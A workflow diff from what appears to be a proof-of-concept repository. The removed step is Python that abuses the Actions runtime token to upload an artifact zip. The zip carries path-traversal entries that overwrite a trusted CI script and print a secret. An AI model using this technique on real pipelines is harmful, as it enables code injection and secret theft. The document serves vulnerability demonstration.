@@ -12,67 +12,9 @@ jobs:
   produce:
     runs-on: ubuntu-latest
     steps:
-      - name: Craft and upload malicious artifact via artifact Twirp API
-        run: |
-          python3 - <<'PY'
-          import os, json, base64, io, zipfile, urllib.request
-
-          tok = os.environ["ACTIONS_RUNTIME_TOKEN"]
-          base = os.environ["ACTIONS_RESULTS_URL"].rstrip("/")
-          payload = tok.split(".")[1]
-          payload += "=" * (-len(payload) % 4)
-          claims = json.loads(base64.urlsafe_b64decode(payload).decode())
-          scp = claims.get("scp", "")
-          rid = jid = None
-          for part in scp.split(" "):
-              p = part.split(":")
-              if p[0] == "Actions.Results" and len(p) == 3:
-                  rid, jid = p[1], p[2]
-          assert rid and jid, scp
-
-          def twirp(method, body):
-              req = urllib.request.Request(
-                  f"{base}/twirp/github.actions.results.api.v1.ArtifactService/{method}",
-                  data=json.dumps(body).encode(),
-                  headers={"Authorization": f"Bearer {tok}", "Content-Type": "application/json"},
-                  method="POST",
-              )
-              with urllib.request.urlopen(req, timeout=60) as r:
-                  return json.loads(r.read().decode())
-
-          buf = io.BytesIO()
-          with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
-              z.writestr("../escaped.txt", "PWNED-TRAVERSAL\n")
-              z.writestr(
-                  "../../ci/preview/preview.ts",
-                  "import os\nprint('PWNED: trusted script replaced by artifact entry')\nprint('POC_SECRET=' + os.environ.get('POC_SECRET','<none>'))\n",
-              )
-              z.writestr("../wrangler.jsonc", '{"marker":"PWNED-CONFIG"}\n')
-          data = buf.getvalue()
-
-          resp = twirp("CreateArtifact", {
-              "workflowRunBackendId": rid,
-              "workflowJobRunBackendId": jid,
-              "name": "docs-preview-dist",
-              "version": 4,
-          })
-          print("create keys:", list(resp))
-          signed = resp.get("signedUploadUrl") or resp.get("signed_upload_url")
-          req = urllib.request.Request(
-              signed, data=data, method="PUT",
-              headers={"x-ms-blob-type": "BlockBlob", "Content-Type": "application/zip"},
-          )
-          with urllib.request.urlopen(req, timeout=120) as r:
-              print("put status", r.status)
-          fin = twirp("FinalizeArtifact", {
-              "workflowRunBackendId": rid,
-              "workflowJobRunBackendId": jid,
-              "name": "docs-preview-dist",
-              "size": str(len(data)),
-          })
-          print("finalize:", fin)
-          PY
-
+      - uses: actions/checkout@v4
+      - name: Craft and upload a hostile artifact zip (attacker-controlled workflow)
+        uses: ./.poc-upload
   consume:
     needs: produce
     runs-on: ubuntu-latest
